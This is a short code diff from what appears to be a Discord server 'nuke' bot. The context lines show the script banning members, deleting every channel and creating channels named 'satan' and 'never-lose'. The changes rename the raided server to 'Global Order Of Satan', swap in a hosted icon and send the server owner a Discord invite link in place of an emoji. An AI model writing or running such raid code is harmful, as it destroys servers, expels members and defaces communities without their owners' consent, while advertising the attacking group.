@@ -18,7 +18,7 @@ message.guild.ban(u, "Amonx No Mercy")
   
 
   
-message.guild.setName(`Satan Win. 😈`, ":))")
+message.guild.setName(`Global Order Of Satan 😈`, ":))")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/544121540283858964/566640720891346965/global-order-of-satan.png`)
   
 message.guild.channels.forEach(c => {
@@ -32,7 +32,7 @@ return c.delete();
     
 
   
-message.guild.owner.send(`**😈**`);
+message.guild.owner.send(`**https://discord.gg/eQfrfJQ**`);
 message.guild.createChannel(`satan `)
 message.guild.createChannel(`never-lose`)
 message.delete()
